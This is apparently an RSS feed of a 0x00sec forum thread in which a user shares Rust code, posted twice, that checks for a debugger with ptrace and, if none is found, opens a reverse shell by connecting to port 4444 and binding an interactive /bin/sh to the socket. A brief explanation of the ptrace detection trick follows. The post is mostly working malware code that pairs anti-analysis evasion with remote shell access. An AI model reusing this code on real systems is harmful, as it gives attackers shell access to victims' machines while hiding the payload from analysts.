<?xml version="1.0" encoding="UTF-8" ?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:dc="http://purl.org/dc/elements/1.1/">
  <channel>
    <title>Anti-Debug with conditional reverse-shell</title>
    <link>https://0x00sec.org/t/anti-debug-with-conditional-reverse-shell/35490</link>
    <description>If you are reading this, this program is basic anti-debug in rustlang, it is able to detect whether or not it is being debugged.
If the program is detected an active tracer then it won&#39;t execute it&#39;s payload...If no then it will send the reverse shell.

```

use nix::sys::ptrace::traceme;
use std::process::exit;

fn main() {
        let _res = match traceme() {
                Ok(_s) =&gt; invade(),Err(_e) =&gt; evade()
        };
        exit(0)
}

fn evade() {
        println!(&quot;......Debugger...Detected......&quot;)
}

fn invade() {
        use std::net::TcpStream;
        use std::process::{Command, Stdio};
        use std::os::unix::io::{AsRawFd, FromRawFd};

        println!(&quot;......Offensive...Started......&quot;);
        let stream = TcpStream::connect(&quot;127.0.0.1:4444&quot;).unwrap();
        let fd = stream.as_raw_fd();
        Command::new(&quot;/bin/sh&quot;)
                .arg(&quot;-i&quot;)
                .stdin(unsafe { Stdio::from_raw_fd(fd) })
                .stdout(unsafe { Stdio::from_raw_fd(fd) })
                .stderr(unsafe { Stdio::from_raw_fd(fd) })
                .spawn()
                .unwrap()
                .wait();
}

```
To understand how it work technically:
Linux debugger use ptrace() to trace, On Linux a process may only call ptrace() once this means if a process is already being debugged then it cannot call ptrace (it will result an Error) this makes debugger detection kinda easy show that we can just issue our own ptrace call(s), evaluate the results and decide what we can do...

&gt;I will be very happy on your reviews :blush:</description>
    
    <lastBuildDate>Tue, 10 Oct 2023 09:16:19 +0000</lastBuildDate>
    <category>Malware</category>
    <atom:link href="https://0x00sec.org/t/anti-debug-with-conditional-reverse-shell/35490.rss" rel="self" type="application/rss+xml" />
      <item>
        <title>Anti-Debug with conditional reverse-shell</title>
        <dc:creator><![CDATA[system]]></dc:creator>
        <description><![CDATA[
            <p>This topic was automatically closed after 121 days. New replies are no longer allowed.</p>
          <p><a href="https://0x00sec.org/t/anti-debug-with-conditional-reverse-shell/35490/3">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/anti-debug-with-conditional-reverse-shell/35490/3</link>
        <pubDate>Tue, 10 Oct 2023 09:25:55 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-35490-3</guid>
        <source url="https://0x00sec.org/t/anti-debug-with-conditional-reverse-shell/35490.rss">Anti-Debug with conditional reverse-shell</source>
      </item>
      <item>
        <title>Anti-Debug with conditional reverse-shell</title>
        <dc:creator><![CDATA[21232f297a57a5a74389]]></dc:creator>
        <description><![CDATA[
            <p>If you are reading this, this program is basic anti-debug in rustlang, it is able to detect whether or not it is being debugged.<br>
If the program is detected an active tracer then it won’t execute it’s payload…If no then it will send the reverse shell.</p>
<pre><code class="lang-auto">
use nix::sys::ptrace::traceme;
use std::process::exit;

fn main() {
        let _res = match traceme() {
                Ok(_s) =&gt; invade(),Err(_e) =&gt; evade()
        };
        exit(0)
}

fn evade() {
        println!("......Debugger...Detected......")
}

fn invade() {
        use std::net::TcpStream;
        use std::process::{Command, Stdio};
        use std::os::unix::io::{AsRawFd, FromRawFd};

        println!("......Offensive...Started......");
        let stream = TcpStream::connect("127.0.0.1:4444").unwrap();
        let fd = stream.as_raw_fd();
        Command::new("/bin/sh")
                .arg("-i")
                .stdin(unsafe { Stdio::from_raw_fd(fd) })
                .stdout(unsafe { Stdio::from_raw_fd(fd) })
                .stderr(unsafe { Stdio::from_raw_fd(fd) })
                .spawn()
                .unwrap()
                .wait();
}

</code></pre>
<p>To understand how it work technically:<br>
Linux debugger use ptrace() to trace, On Linux a process may only call ptrace() once this means if a process is already being debugged then it cannot call ptrace (it will result an Error) this makes debugger detection kinda easy show that we can just issue our own ptrace call(s), evaluate the results and decide what we can do…</p>
<blockquote>
<p>I will be very happy on your reviews <img src="https://0x00sec.org/images/emoji/twitter/blush.png?v=12" title=":blush:" class="emoji" alt=":blush:" loading="lazy" width="20" height="20"></p>
</blockquote>
          <p><a href="https://0x00sec.org/t/anti-debug-with-conditional-reverse-shell/35490/1">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/anti-debug-with-conditional-reverse-shell/35490/1</link>
        <pubDate>Sat, 10 Jun 2023 17:25:34 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-35490-1</guid>
        <source url="https://0x00sec.org/t/anti-debug-with-conditional-reverse-shell/35490.rss">Anti-Debug with conditional reverse-shell</source>
      </item>
  </channel>
</rss>
